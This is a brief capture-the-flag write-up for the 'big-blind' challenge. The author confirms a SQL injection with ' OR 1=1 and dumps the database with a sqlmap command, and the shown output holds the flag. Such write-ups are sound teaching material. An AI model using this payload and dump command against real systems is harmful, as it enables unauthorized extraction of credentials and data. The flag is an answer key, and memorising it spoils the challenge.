# big-blind (70 solves, 474 points)

## Description:
[https://big-blind.hsc.tf](https://big-blind.hsc.tf)

## Solution:
Guessing from the challenge name, this is probably some sort of blind injection. Trying ' OR 1=1, confirms it's a SQL injection. Now, you could write your own injection script but because I'm lazy and a script kiddie, I used sqlmap. After a couple minutes, it was able to using a timing attack to find the flag.
```
luke@parrot:~/Downloads$ sqlmap  https://big-blind.hsc.tf/ --form --batch  --dump --no-cast
...
...
+-----------------------------+--------+
| pass                        | user   |
+-----------------------------+--------+
| flag{any_info_is_good_info} | admin  |
+-----------------------------+--------+
```
## Flag:
`flag{any_info_is_good_info}`
